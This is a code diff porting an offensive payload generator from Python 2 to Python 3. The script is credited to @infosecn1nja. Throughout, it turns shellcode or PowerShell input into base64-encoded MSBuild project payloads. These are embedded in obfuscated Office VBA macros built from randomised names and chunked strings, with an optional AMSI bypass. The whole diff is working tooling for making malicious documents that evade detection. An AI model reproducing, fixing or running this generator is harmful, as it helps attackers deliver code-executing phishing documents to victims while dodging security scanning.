@@ -19,11 +19,11 @@ import os, re, sys, base64
 import random, string, argparse
 
 def chunks(l, n):
-    for i in xrange(0, len(l), n):
+    for i in range(0, len(l), n):
         yield l[i:i+n]
 
 def gen_str():
-	return ''.join(random.choice(string.letters) for i in range(random.randint(12,20)))
+	return ''.join(random.choice(string.ascii_letters) for i in range(random.randint(12,20)))
 
 def minimize(output):
     output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
@@ -51,16 +51,17 @@ def generate_shellcode(filename):
 	shellcode = ''
 
 	if not os.path.exists(filename):
-		print '[!] File Not Found'
+		print('[!] File Not Found')
 		sys.exit(0)
 
-	with open(filename) as f:
-	   shellcode = bytes(bytearray(f.read()))
+	with open(filename, 'rb') as f:
+	   shellcode = f.read()
 	   f.close()
 
 	targetName = gen_str()
 	template = open('templates/MSBuild_shellcode.csproj','r').read()
-	msbuild = template.replace('[SHELLCODE]',base64.b64encode(shellcode)).replace('[TARGETNAME]',targetName)
+	msbuild = template.replace('[SHELLCODE]', base64.b64encode(shellcode).decode())
+	msbuild = msbuild.replace('[TARGETNAME]',targetName)
 
 	return msbuild
 
@@ -68,17 +69,18 @@ def generate_powershell(filename):
     powershell = ''
 
     if not os.path.exists(filename):
-    	print '[!] File Not Found'
+    	print('[!] File Not Found')
     	sys.exit(0)
 
-    with open(filename, 'rb') as f:
+    with open(filename, 'rt') as f:
       inp = f.read()
+      #print(inp)
       powershell += inp
 
-    ps = base64.b64encode(powershell)
+    ps = base64.b64encode(powershell.encode())
     targetName = gen_str()
     template = open('templates/MSBuild_powershell.csproj','r').read()
-    msbuild = template.replace('[POWERSHELL]',ps).replace('[TARGETNAME]',targetName)
+    msbuild = template.replace('[POWERSHELL]',ps.decode()).replace('[TARGETNAME]',targetName)
 
     return msbuild
 
@@ -86,7 +88,7 @@ def generate_custom(filename):
     content = ''
 
     if not os.path.exists(filename):
-    	print '[!] File Not Found'
+    	print('[!] File Not Found')
     	sys.exit(0)
 
     with open(filename, 'rb') as f:
@@ -101,7 +103,7 @@ def generate_macro(msbuild_template, amsi_bypass=False):
 	Str = gen_str()
 	Str2 = gen_str()
 
-	msbuild_encoded = base64.b64encode(minimize(msbuild_template))
+	msbuild_encoded = base64.b64encode(minimize(msbuild_template).encode())
 	chunk = list(chunks(msbuild_encoded,200))
 
 	macro_str = ''
@@ -148,10 +150,10 @@ def generate_macro(msbuild_template, amsi_bypass=False):
 
 	macro_str += 'Function ' + Method + '()\n'
 
-	payload = Str+" = \"" + str(chunk[0]) + "\"\n"
+	payload = Str+" = \"" + str(chunk[0].decode()) + "\"\n"
 
 	for chk in chunk[1:]:
-	    payload += "  "+Str+" = "+Str+" + \"" + str(chk) + "\"\n"
+	    payload += "  "+Str+" = "+Str+" + \"" + str(chk.decode()) + "\"\n"
 
 	macro_str += '  ' + payload
 
@@ -225,7 +227,7 @@ Author : Rahmat Nurfauzi (@infosecn1nja)
 
 if __name__ == "__main__":
 
-   print banner()
+   print(banner())
 
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i','--inputfile', help='Input file you want to embed into the macro', required=True)   
@@ -249,11 +251,11 @@ if __name__ == "__main__":
    elif payload.lower() == 'custom':
    	  msbuild_payload = generate_custom(inputfile)
    else:
-      print '[!] Invalid type payload'
+      print('[!] Invalid type payload')
       sys.exit(0)
 
    if msbuild_payload != '':
-   	print "[*] Writing msbuild {} payload.".format(payload)
+   	print("[*] Writing msbuild {} payload.".format(payload))
    	macro = generate_macro(msbuild_payload, amsi_bypass)
    	output_file(output,macro)
-   	print "[*] {} macro sucessfully saved to disk.".format(output)
+   	print("[*] {} macro sucessfully saved to disk.".format(output))
